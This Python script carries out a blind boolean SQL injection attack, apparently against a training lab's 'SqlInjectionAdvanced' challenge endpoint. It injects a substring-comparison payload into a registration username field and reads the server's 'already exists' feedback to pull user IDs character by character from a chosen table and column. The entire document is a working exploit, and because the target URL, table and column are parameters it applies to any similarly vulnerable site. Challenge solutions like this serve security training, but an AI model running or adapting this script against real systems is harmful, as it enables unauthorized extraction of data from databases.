import json
import requests

def find_users(cookie, server_url, table_name, userid_column):
    """
    Extracts user IDs from a specific table and column.

    Args:
        cookie (str): Session cookie for authentication.
        server_url (str): The URL of the server to target.
        table_name (str): The table to query.
        userid_column (str): The column holding user IDs.

    Returns:
        list: A list of user IDs.
    """
    alphabet = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789!@#$%^&*()'
    headers = {
        'Cookie': cookie,
    }

    def extract_userid_for_row(row_offset, char_index):
        value = ''
        alphabet_index = 0

        while True:
            payload = "' OR (SELECT substring({}, {}, 1) FROM {} LIMIT 1 OFFSET {}) = '{}' --".format(
                userid_column, char_index, table_name, row_offset, alphabet[alphabet_index]
            )
            data = {
                'username_reg': payload,
                'email_reg': 'a@a',
                'password_reg': 'a',
                'confirm_password_reg': 'a'
            }
            r = requests.put(f'{server_url}/SqlInjectionAdvanced/challenge', headers=headers, data=data)

            try:
                response = json.loads(r.text)
            except:
                return None

            if "already exists" not in response.get('feedback', ''):
                alphabet_index += 1
                if alphabet_index >= len(alphabet):
                    break
            else:
                value += alphabet[alphabet_index]
                alphabet_index = 0
                char_index += 1

        return value

    all_userids = []
    row_offset = 0

    while True:
        userid = extract_userid_for_row(row_offset, 1)
        if userid:
            all_userids.append(userid)
            row_offset += 1
        else:
            break

    return all_userids
